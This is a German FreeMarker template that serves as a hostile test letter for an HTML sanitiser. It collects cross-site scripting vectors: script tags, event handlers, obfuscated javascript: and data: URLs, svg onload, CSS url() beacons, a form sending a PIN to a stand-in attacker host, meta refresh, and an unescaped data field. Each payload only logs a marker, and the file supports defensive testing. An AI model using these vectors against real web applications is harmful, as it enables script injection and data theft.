<#--
  Bösartiges Testschreiben für die HTML-Bereinigung (ADR-014). Jeder Angriff meldet sich bei
  Ausführung mit console.log("ANGRIFF …"), einem alert oder einer Anfrage an angriff.invalid.
  Die Prüfung mit `npm run angriff` erwartet: nichts davon passiert.
-->
<p>${schreiben.anrede}</p>
<p>Angriffe aus der Vorlage:</p>
<script>console.log("ANGRIFF script"); alert("ANGRIFF script");</script>
<p onclick="console.log('ANGRIFF onclick')" onmouseover="console.log('ANGRIFF onmouseover')">Absatz mit Eventhandlern</p>
<img src="x" onerror="console.log('ANGRIFF onerror')" alt="kaputtes Bild"/>
<img src="https://angriff.invalid/zaehlpixel.png" alt="externes Bild"/>
<p><a href="javascript:console.log('ANGRIFF javascript-url')">Link mit javascript:</a></p>
<p><a href=" JaVa&#x09;ScRiPt:console.log('ANGRIFF verschleiert')">Verschleierter Link</a></p>
<p><a href="data:text/html,&lt;script&gt;console.log('ANGRIFF data-url')&lt;/script&gt;">Link mit data:</a></p>
<p><a href="https://erlaubt.invalid/">Erlaubter Link</a></p>
<iframe src="data:text/html,&lt;script&gt;console.log('ANGRIFF iframe')&lt;/script&gt;"></iframe>
<object data="https://angriff.invalid/objekt"></object>
<embed src="https://angriff.invalid/embed"/>
<svg onload="console.log('ANGRIFF svg')"><circle r="5"/></svg>
<form action="https://angriff.invalid/"><input name="pin"/><button>Senden</button></form>
<style>@import url(https://angriff.invalid/import.css); body { background: url(https://angriff.invalid/bg.png); }</style>
<p style="background-image: url(https://angriff.invalid/inline.png); color: red">Absatz mit externem Hintergrund</p>
<p style="width: expression(console.log('ANGRIFF expression'))">Absatz mit expression()</p>
<base href="https://angriff.invalid/"/>
<meta http-equiv="refresh" content="0; url=https://angriff.invalid/"/>
<!-- Kommentar mit <script>console.log("ANGRIFF kommentar")</script> -->
<details open="open"><summary>Unbekanntes Element</summary>Inhalt bleibt</details>
<p>Angriffe aus den Daten, mit Escaping (ADR-008): ${schreiben.angriff}</p>
<p>Angriffe aus den Daten, Escaping von der Vorlage abgeschaltet: ${schreiben.angriff?no_esc}</p>
<p class="gruss">${schreiben.gruss}</p>
